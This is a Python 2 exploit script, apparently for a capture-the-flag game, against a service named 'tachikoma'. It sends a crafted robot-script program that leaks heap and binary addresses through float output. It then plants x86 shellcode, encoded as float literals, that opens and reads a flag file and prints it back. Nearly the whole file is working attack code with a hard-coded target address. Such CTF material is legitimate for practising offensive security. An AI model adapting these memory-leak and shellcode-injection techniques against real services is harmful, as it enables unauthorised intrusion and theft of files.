import socket
import struct
import time
import telnetlib
import os
import sys
import random
import string

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

host = 'localhost'
port = 9999

def n2f(x):
	high = str((x >> 1) & 0x3fff)
	low = str(x >> 15)
	#if len(low) > 5:
	#	if low[0] == '1':
	#		low = low[-5:]
	ret = high + '.' + low
	#print ret
	return ret

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def exploit(host):
	port = 9
	ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss.connect((host, port))
	f = ss.makefile('rw', bufsize=0)

	offset = 0x13f48
	preleak = ''.join([random.choice(string.ascii_letters) for _ in xrange(7)])
	leak = ''.join([random.choice(string.ascii_letters) for _ in xrange(6)])
	s = '310a3436360a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d65282022626f622220290a20205f74726573756c745f3330203d20300a20205f74726573756c745f3332203d203132382e300a20207072696e742820225052454c45414b2220290a20207072696e7428205f74726573756c745f313020290a20207072696e7428205f74726573756c745f383420290a20207072696e742820224c45414b45442220290a20207072696e74282022434f4445d66161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161612220290a7d0a'.decode('hex')
	i = s.find('PRELEAK')
	s = s[:i] + preleak + s[i+7:]
	i = s.find('LEAKED')
	s = s[:i] + leak + s[i+6:]
	f.write(s)

	#t = telnetlib.Telnet()
	#t.sock = ss
	#t.interact()

	readuntil(f, 'debug: bob: ' + preleak + '\n')
	readuntil(f, 'bob: ')
	v = readuntil(f, '\n')
	v = v.strip().split('.')
	if v[0][0] == '-':
		v[0] = v[0][1:]
	v[1] = '1' + v[1]
	#print v
	high = (int(v[0]) << 1)
	low = int(v[1]) << 15
	heap_addr = low + high
	#print 'heap: %s' % hex(heap_addr)

	readuntil(f, 'bob: ')
	v = readuntil(f, '\n')
	readuntil(f, 'CODE')
	v = v.strip().split('.')
	if v[0][0] == '-':
		v[0] = v[0][1:]
	v[1] = '1' + v[1]
	#print v
	high = (int(v[0]) << 1)
	low = int(v[1]) << 15
	leak_addr = low + high
	binary_base = leak_addr - offset
	#print 'binary_base: %s' % hex(binary_base)

	readuntil(f, 'Seed: ')

	sc_addr = heap_addr + 0x6f820
	flag_addr = heap_addr + 0x6f700
	#print 'flag: %s' % hex(flag_addr)
	#print 'sc: %s' % hex(sc_addr)

	s2 = '''
Useless
{
  print( "bbbb" )
}
Core
{
}
Init
{
	name( "/home/flags/tachikoma" )
  _tresult_30 = 0
  _tresult_32 = 128

  _tresult_92 = %s
  _tresult_93 = %s
  _tresult_94 = %s
  _tresult_95 = %s
  _tresult_96 = %s
  _tresult_97 = %s
  _tresult_98 = %s
  _tresult_99 = %s
  _tresult_100 = %s
  _tresult_101 = %s
  _tresult_102 = %s
  _tresult_103 = %s
  _tresult_104 = %s
  _tresult_105 = %s
  _tresult_106 = %s
  _tresult_107 = %s

  _tresult_108 = %s
  _tresult_109 = %s
  _tresult_110 = %s
  _tresult_111 = %s

  _tresult_112 = %s
  _tresult_113 = %s
  _tresult_114 = %s
  _tresult_115 = %s

  _tresult_116 = %s
  _tresult_117 = %s
  _tresult_118 = %s
  _tresult_119 = %s

  _tresult_84 = %s
  print( "jobs done" )
}
''' % ('2120.08405', #n2f(0x106a9090),
n2f(0x58909090),
n2f(0xe0f79090),
n2f(0xc1899090),
n2f(0xb09090 + ((flag_addr >> 24) & 0xff) * 0x1000000),
n2f(0xe1f79090),
n2f(0xb09090 + ((flag_addr >> 16) & 0xff) * 0x1000000),
n2f(0xe1f79090),
n2f(0xb09090 + ((flag_addr >> 8) & 0xff) * 0x1000000),
n2f(0xe1f79090),
n2f(0xb09090 + ((flag_addr) & 0xff) * 0x1000000),
n2f(0xc3899090),
'2120.02773', #n2f(0x56a9090), #
n2f(0x58909090),
n2f(0x99909090),
n2f(0xd1899090),
n2f(0x80cd9090),
n2f(0xc3899090),
n2f(0xe1899090),
n2f(0x80b29090),
'2120.01889', #n2f(0x3b09090), #
n2f(0x80cd9090),
n2f(0x92909090),
'2120.00871', #n2f(0x1b39090), #
'2120.02401', #n2f(0x4b09090), #
n2f(0x80cd9090),
'2120.00865', #n2f(0x1b09090), #
n2f(0x80cd9090),
	n2f(sc_addr)) #'8481.33924')

	s2 = '1\n%d\n%s' % (len(s2), s2)
	#s2 = '310a3137320a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d65282022c8d850f9c28371f72220290a20207072696e7428205f74726573756c745f383420290a20205f74726573756c745f3833203d205f74726573756c745f32300a20205f74726573756c745f3834203d205f74726573756c745f32310a20207072696e742820226a6f627320646f6e652220290a7d0a'.decode('hex')
	
	'''
	index = 0
	while index < len(s2):
		index = s2.find('\xf7', index)
		if index == -1: break
		v = up(s2[index - 3:index + 1])
		v = v - 0xf7716000 + binary_base
		#print index, hex(v)
		s2 = s2[:index - 3] + p(v) + s2[index + 1:]
		index += 4

	index = 0
	while index < len(s2):
		index = s2.find('\xf9', index)
		if index == -1: break
		v = up(s2[index - 3:index + 1])
		v = v - 0xf949e378 + heap_addr
		print index, hex(v)
		v = 0x41414141
		s2 = s2[:index - 3] + p(v) + s2[index + 1:]
		index += 4
	'''

	#raw_input('wait')
	f.write(s2)

	readuntil(f, 'Robot 1 start: ')
	readuntil(f, '\n')
	flag = f.read(26).strip()
	print flag
	return flag

if __name__ == '__main__':
    exploit('192.168.165.135')


#from pwn import *
#p = process("./tachikoma")
#raw_input("debug")
#p.send(s)
#p.interactive()
